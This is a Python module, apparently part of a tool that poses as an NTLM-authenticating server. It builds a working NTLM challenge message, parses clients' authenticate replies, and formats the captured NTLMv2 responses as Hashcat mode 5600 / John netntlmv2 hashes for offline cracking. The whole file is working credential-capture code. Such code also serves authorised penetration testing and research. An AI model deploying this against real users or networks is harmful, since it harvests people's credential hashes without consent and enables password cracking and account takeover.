"""NTLM message parser for capturing NTLMv2 hashes.

Parses NTLM Type 1 (Negotiate), Type 2 (Challenge), and Type 3 (Authenticate)
messages to extract credentials in Hashcat mode 5600 / John netntlmv2 format:

    user::domain:server_challenge:nt_proof_str:nt_response_remainder
"""

from __future__ import annotations

import base64
import os
import struct


# NTLM message type constants
NTLM_NEGOTIATE = 1
NTLM_CHALLENGE = 2
NTLM_AUTHENTICATE = 3

NTLM_SIGNATURE = b"NTLMSSP\x00"


def generate_challenge() -> bytes:
    """Generate an 8-byte random server challenge."""
    return os.urandom(8)


def build_ntlm_challenge(server_challenge: bytes) -> bytes:
    """Build an NTLM Type 2 (Challenge) message.

    This is a minimal but functional Type 2 message that Windows/curl/browsers
    will accept and respond to with NTLMv2 credentials.
    """
    # Flags: NTLMSSP_NEGOTIATE_UNICODE | NTLMSSP_NEGOTIATE_NTLM |
    #        NTLMSSP_TARGET_TYPE_SERVER | NTLMSSP_NEGOTIATE_TARGET_INFO
    flags = 0x00028233

    # Target name (empty, will use server's)
    target_name = "SERVER".encode("utf-16-le")
    target_name_len = len(target_name)

    # Target info (minimal: domain name + terminator)
    # MsvAvNbDomainName (type 2)
    domain = "WORKGROUP".encode("utf-16-le")
    target_info = struct.pack("<HH", 2, len(domain)) + domain
    # MsvAvEOL (type 0, len 0) - terminator
    target_info += struct.pack("<HH", 0, 0)
    target_info_len = len(target_info)

    # Offsets
    target_name_offset = 56  # after fixed header
    target_info_offset = target_name_offset + target_name_len

    msg = bytearray()
    msg += NTLM_SIGNATURE
    msg += struct.pack("<I", NTLM_CHALLENGE)  # Type 2
    # Target name fields (len, max_len, offset)
    msg += struct.pack("<HHI", target_name_len, target_name_len, target_name_offset)
    # Negotiate flags
    msg += struct.pack("<I", flags)
    # Server challenge (8 bytes)
    msg += server_challenge
    # Reserved (8 bytes)
    msg += b"\x00" * 8
    # Target info fields (len, max_len, offset)
    msg += struct.pack("<HHI", target_info_len, target_info_len, target_info_offset)
    # Version (8 bytes) - Windows 10
    msg += struct.pack("<BBHBBBB", 10, 0, 19041, 0, 0, 0, 15)
    # Payload
    msg += target_name
    msg += target_info

    return bytes(msg)


def parse_ntlm_type(data: bytes) -> int | None:
    """Return the NTLM message type (1, 2, or 3) or None if not NTLM."""
    if len(data) < 12:
        return None
    if data[:8] != NTLM_SIGNATURE:
        return None
    msg_type = struct.unpack_from("<I", data, 8)[0]
    if msg_type in (NTLM_NEGOTIATE, NTLM_CHALLENGE, NTLM_AUTHENTICATE):
        return msg_type
    return None


def parse_ntlm_type3(data: bytes, server_challenge: bytes) -> dict | None:
    """Parse an NTLM Type 3 (Authenticate) message and extract the NTLMv2 hash.

    Returns a dict with:
        - user: username
        - domain: domain/workgroup
        - hash: full hash string in Hashcat 5600 / John netntlmv2 format
        - nt_response: hex of full NT response
    """
    if len(data) < 88:
        return None
    if data[:8] != NTLM_SIGNATURE:
        return None

    msg_type = struct.unpack_from("<I", data, 8)[0]
    if msg_type != NTLM_AUTHENTICATE:
        return None

    # LM response
    lm_len, lm_max, lm_offset = struct.unpack_from("<HHI", data, 12)
    # NT response
    nt_len, nt_max, nt_offset = struct.unpack_from("<HHI", data, 20)
    # Domain
    dom_len, dom_max, dom_offset = struct.unpack_from("<HHI", data, 28)
    # User
    user_len, user_max, user_offset = struct.unpack_from("<HHI", data, 36)

    if nt_offset + nt_len > len(data):
        return None
    if user_offset + user_len > len(data):
        return None
    if dom_offset + dom_len > len(data):
        return None

    nt_response = data[nt_offset:nt_offset + nt_len]
    domain = data[dom_offset:dom_offset + dom_len].decode("utf-16-le", errors="replace")
    user = data[user_offset:user_offset + user_len].decode("utf-16-le", errors="replace")

    if len(nt_response) < 24:
        return None

    # NTLMv2: first 16 bytes = NTProofStr (HMAC-MD5), rest = client blob
    nt_proof_str = nt_response[:16]
    nt_blob = nt_response[16:]

    # Format: user::domain:server_challenge:nt_proof_str:blob
    hash_str = (
        f"{user}::{domain}:"
        f"{server_challenge.hex()}:"
        f"{nt_proof_str.hex()}:"
        f"{nt_blob.hex()}"
    )

    return {
        "user": user,
        "domain": domain,
        "hash": hash_str,
        "nt_response_hex": nt_response.hex(),
    }


def decode_ntlm_auth(auth_value: str) -> bytes | None:
    """Decode the base64 blob from an 'Authorization: NTLM <base64>' header."""
    parts = auth_value.strip().split(None, 1)
    if len(parts) != 2:
        return None
    scheme, blob = parts
    if scheme.upper() != "NTLM":
        return None
    try:
        return base64.b64decode(blob)
    except Exception:
        return None
